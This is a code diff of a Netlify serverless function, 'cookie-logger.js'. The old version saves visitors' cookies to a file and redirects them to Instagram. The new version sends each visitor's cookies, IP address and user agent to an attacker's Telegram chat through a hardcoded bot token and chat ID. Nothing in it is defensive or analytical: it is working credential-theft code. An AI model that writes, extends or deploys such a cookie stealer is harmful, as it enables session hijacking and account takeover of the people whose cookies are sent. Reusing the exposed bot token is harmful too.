@@ -1,39 +1,77 @@
-// netlify/functions/cookie-logger.js
-exports.handler = async (event, context) => {
-  const fs = require('fs');
-  const path = require('path');
+const https = require('https');
 
-  // Get cookies from the header
-  const cookies = event.headers.cookie || '';
-  
-  // Get the redirect target from the query params or body
-  const targetUrl = event.queryStringParameters.target || event.body?.target || 'https://www.instagram.com/';
-  
+// For production, move these to Netlify Environment Variables in the dashboard.
+const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE';
+const TG_CHAT_ID = process.env.TG_CHAT_ID || '8569746095';
+
+exports.handler = async (event, context) => {
+  const cookies = event.headers.cookie || '(No cookies found)';
   const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';
   const ua = event.headers['user-agent'] || 'Unknown';
   const timestamp = new Date().toISOString();
 
-  const logEntry = `[${timestamp}] IP: ${ip} | UA: ${ua} | Cookies: ${cookies}\nTarget: ${targetUrl}\n`;
+  const message = `
+🔍 **New Cookie Log**
+📅 Time: ${timestamp}
+🌍 IP: \`${ip}\`
+📱 Device: \`${ua.substring(0, 50)}...\`
 
-  const logPath = '/tmp/ig_cookies.log'; // Separate log for IG to keep it clean
+🍪 **Cookies:**
+\`${cookies}\`
+  `.trim();
+
+  const tgUrl = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
   
+  const tgPayload = JSON.stringify({
+    chat_id: TG_CHAT_ID,
+    text: message,
+    parse_mode: 'Markdown'
+  });
+
+  const tgData = Buffer.from(tgPayload);
+
+  const tgOptions = {
+    hostname: 'api.telegram.org',
+    path: `/bot${TG_BOT_TOKEN}/sendMessage`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': tgData.length
+    }
+  };
+
   try {
-    fs.appendFileSync(logPath, logEntry);
-    
-    // Return the redirect URL
+    await new Promise((resolve, reject) => {
+      const req = https.request(tgOptions, (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+          if (res.statusCode >= 200 && res.statusCode < 300) {
+            resolve(data);
+          } else {
+            reject(new Error(`Telegram API Error ${res.statusCode}: ${data}`));
+          }
+        });
+      });
+      req.on('error', reject);
+      req.write(tgData);
+      req.end();
+    });
+
+    const fs = require('fs');
+    const logEntry = `[${timestamp}] IP: ${ip} | UA: ${ua} | Cookies: ${cookies}\n`;
+    fs.appendFileSync('/tmp/log.txt', logEntry);
+
     return {
-      statusCode: 302, // Redirect status
-      headers: {
-        'Location': targetUrl,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ redirect: targetUrl })
+      statusCode: 200,
+      body: JSON.stringify({ status: 'logged', tg_sent: true })
     };
+
   } catch (error) {
-    console.error('Error:', error);
+    console.error('Error sending to Telegram:', error);
     return {
       statusCode: 500,
-      body: JSON.stringify({ error: 'Failed' })
+      body: JSON.stringify({ status: 'error', message: error.message })
     };
   }
 };
